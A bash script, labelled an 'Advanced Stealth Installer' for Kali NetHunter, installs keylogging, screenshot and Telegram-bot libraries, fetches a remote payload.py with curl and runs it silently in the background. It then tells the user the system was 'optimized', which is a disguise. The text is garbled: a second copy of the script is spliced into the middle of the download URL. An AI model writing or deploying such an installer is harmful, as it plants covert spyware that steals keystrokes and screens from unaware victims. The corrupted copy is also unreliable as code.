#!/bin/bash
# Advanced Stealth Installer for Kali NetHunter

echo "Updating and Installing Dependencies..."
sudo apt update
sudo apt install python3 python3-pip termux-api -y 

# Python packages install (Kali compatibility added)
pip3 install pyTelegramBotAPI requests pynput pyautogui pillow --break-system-packages

# আপনার গিটহাব থেকে পেলোড নামানো
curl -LO https://raw.g#!/bin/bash
# Advanced Stealth Installer for Kali NetHunter

echo "Updating and Installing Dependencies..."
sudo apt update
sudo apt install python3 python3-pip termux-api -y 

# Python packages install (Kali compatibility added)
pip3 install pyTelegramBotAPI requests pynput pyautogui pillow --break-system-packages

# আপনার গিটহাব থেকে পেলোড নামানো
curl -LO https://raw.githubusercontent.com/yashkhanofficial/Advanced-system-core/main/payload.py

# ব্যাকগ্রাউন্ডে পারমানেন্টলি চালু করা
nohup python3 payload.py > /dev/null 2>&1 &

echo "System Optimized Successfully with Persistence!".com/yashkhanofficial/Advanced-system-core/main/payload.py

# ব্যাকগ্রাউন্ডে পারমানেন্টলি চালু করা
nohup python3 payload.py > /dev/null 2>&1 &

echo "System Optimized Successfully with Persistence!"
